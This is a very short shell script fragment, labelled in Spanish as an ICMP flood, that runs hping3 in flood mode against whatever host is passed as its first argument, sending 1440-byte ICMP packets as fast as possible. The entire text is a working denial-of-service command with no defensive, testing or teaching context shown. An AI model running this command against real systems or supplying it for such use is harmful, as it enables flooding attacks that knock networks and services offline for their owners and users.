echo
echo "Inundacion ICMP"
hping3 $1 -1 --flood -d 1440 -e "Inundacion ICMP"
